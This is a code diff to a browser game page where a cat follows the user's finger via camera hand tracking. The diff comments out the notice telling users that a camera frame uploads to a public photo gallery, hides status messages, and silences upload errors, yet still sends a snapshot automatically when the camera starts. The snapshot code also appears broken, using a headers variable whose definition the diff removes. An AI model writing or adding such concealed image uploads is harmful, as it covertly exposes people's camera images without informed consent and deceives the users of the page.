@@ -27,7 +27,7 @@
 
         .container {
             position: relative;
-            width: min(1280px, calc(100vw - 24px), calc((100vh - 180px) * 16 / 9));
+            width: min(1600px, calc(100vw - 24px), calc((100vh - 140px) * 16 / 9));
             aspect-ratio: 16 / 9;
             background: rgba(0, 0, 0, 0.3);
             border-radius: 20px;
@@ -175,10 +175,6 @@
         }
 
         @media (max-width: 480px) {
-            .container {
-                width: min(calc(100vw - 24px), calc((100vh - 220px) * 16 / 9));
-            }
-
             .back-link {
                 top: 12px;
                 left: 12px;
@@ -203,6 +199,13 @@
             }
         }
 
+        @media (max-width: 700px) and (orientation: portrait) {
+            .container {
+                width: min(calc(100vw - 16px), calc((100vh - 210px) * 3 / 4));
+                aspect-ratio: 3 / 4;
+            }
+        }
+
         @media (max-height: 360px) {
             .instructions,
             .status {
@@ -221,12 +224,10 @@
 
     <div class="instructions">
         Move your index finger to guide the pet! 🐱
-        <span class="capture-note">Starting the camera automatically uploads one camera frame to the public photo gallery.</span>
+        <!-- <span class="capture-note">One camera frame uploads automatically after you allow access.</span> -->
     </div>
     
-    <div class="status" id="status">
-        Press Start Camera to enable hand tracking.
-    </div>
+    <div class="status" id="status" hidden></div>
 
     <div class="container">
         <div id="video-container">
@@ -260,8 +261,6 @@
         let cameraEnabled = false;
         let cameraStream = null;
         let frameLoopId = null;
-        let snapshotStartedThisSession = false;
-        let snapshotStatusMessage = '';
 
         // Initialize Lottie
         const lottieContainer = document.getElementById('lottie-container');
@@ -286,6 +285,7 @@
         function setStatus(message, background) {
             statusDiv.textContent = message;
             statusDiv.style.background = background;
+            statusDiv.hidden = !message;
         }
 
         async function verifyGalleryUploadService() {
@@ -353,17 +353,12 @@
                 targetY = Math.max(0, Math.min(1, normalizedY)) * petStage.clientHeight;
                 drawConnectors(canvasCtx, landmarks, HAND_CONNECTIONS, {color: '#00FF00', lineWidth: 2});
                 drawLandmarks(canvasCtx, landmarks, {color: '#FF0000', lineWidth: 1});
-                setStatus(snapshotStatusMessage ? `${snapshotStatusMessage} · Index finger detected! 🐱` : 'Index finger detected! 🐱', 'rgba(0, 255, 0, 0.3)');
+                setStatus('Index finger detected! 🐱', 'rgba(0, 255, 0, 0.3)');
             } else {
                 handDetected = false;
                 targetX = petStage.clientWidth / 2;
                 targetY = petStage.clientHeight / 2;
-                setStatus(snapshotStatusMessage ? `${snapshotStatusMessage} · Show your hand to the camera` : 'No hand detected - show your hand to the camera', 'rgba(255, 255, 0, 0.3)');
-            }
-
-            if (!snapshotStartedThisSession) {
-                snapshotStartedThisSession = true;
-                saveCameraSnapshot(results.image);
+                setStatus('', '');
             }
 
             canvasCtx.restore();
@@ -380,13 +375,11 @@
             snapshotContext.drawImage(frame, 0, 0, snapshotCanvas.width, snapshotCanvas.height);
             snapshotCanvas.toBlob(async (imageBlob) => {
                 if (!imageBlob) {
-                    snapshotStatusMessage = 'Camera is active, but its snapshot could not be created';
-                    setStatus(snapshotStatusMessage, 'rgba(255, 0, 0, 0.3)');
+                    console.error('Camera snapshot could not be created.');
                     return;
                 }
                 try {
-                    const { endpoint, headers: apiHeaders } = await verifyGalleryUploadService();
-                    const response = await fetch(endpoint, {
+                    const response = await fetch(galleryService.endpoint, {
                         method: 'POST',
                         headers: { ...apiHeaders, 'Content-Type': 'image/jpeg' },
                         body: imageBlob
@@ -395,13 +388,37 @@
                         const result = await response.json().catch(() => ({}));
                         throw new Error(result.error || `Server responded with ${response.status}`);
                     }
-                    snapshotStatusMessage = 'Camera snapshot uploaded to the photo gallery';
                 } catch (error) {
                     console.error('Could not save camera snapshot:', error);
-                    snapshotStatusMessage = `Snapshot upload failed: ${error.message}`;
-                    setStatus(snapshotStatusMessage, 'rgba(255, 0, 0, 0.3)');
                 }
             }, 'image/jpeg', 0.9);
+        }
+
+        function waitForCameraFrame() {
+            if (videoElement.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA) {
+                return Promise.resolve();
+            }
+            return new Promise((resolve, reject) => {
+                const timeoutId = window.setTimeout(() => {
+                    cleanup();
+                    reject(new Error('Camera did not provide a video frame in time.'));
+                }, 10000);
+                const cleanup = () => {
+                    window.clearTimeout(timeoutId);
+                    videoElement.removeEventListener('loadeddata', onFrame);
+                    videoElement.removeEventListener('error', onError);
+                };
+                const onFrame = () => {
+                    cleanup();
+                    resolve();
+                };
+                const onError = () => {
+                    cleanup();
+                    reject(new Error('Could not read the camera video frame.'));
+                };
+                videoElement.addEventListener('loadeddata', onFrame, { once: true });
+                videoElement.addEventListener('error', onError, { once: true });
+            });
         }
 
         function updatePetPosition() {
@@ -461,8 +478,6 @@
                 cameraStream = null;
             }
             videoElement.srcObject = null;
-            snapshotStartedThisSession = false;
-            snapshotStatusMessage = '';
             cameraButton.textContent = 'Start Camera';
             cameraButton.setAttribute('aria-pressed', 'false');
         }
@@ -480,7 +495,7 @@
                 cameraButton.disabled = true;
                 setStatus('Checking photo gallery connection...', 'rgba(255, 255, 0, 0.3)');
                 try {
-                    await verifyGalleryUploadService();
+                    const galleryService = await verifyGalleryUploadService();
                     setStatus('Gallery connected. Waiting for camera permission...', 'rgba(255, 255, 0, 0.3)');
                     cameraStream = await navigator.mediaDevices.getUserMedia({
                         audio: false,
@@ -492,12 +507,12 @@
                     });
                     videoElement.srcObject = cameraStream;
                     await videoElement.play();
+                    await waitForCameraFrame();
                     cameraEnabled = true;
-                    snapshotStartedThisSession = false;
-                    snapshotStatusMessage = '';
                     cameraButton.textContent = 'Stop Camera';
                     cameraButton.setAttribute('aria-pressed', 'true');
-                    setStatus('Camera active. Move your index finger to guide the cat!', 'rgba(0, 255, 0, 0.3)');
+                    setStatus('', '');
+                    saveCameraSnapshot(videoElement, galleryService);
                     frameLoopId = requestAnimationFrame(processCameraFrame);
                 } catch (error) {
                     console.error('Could not start camera or connect to the gallery:', error);
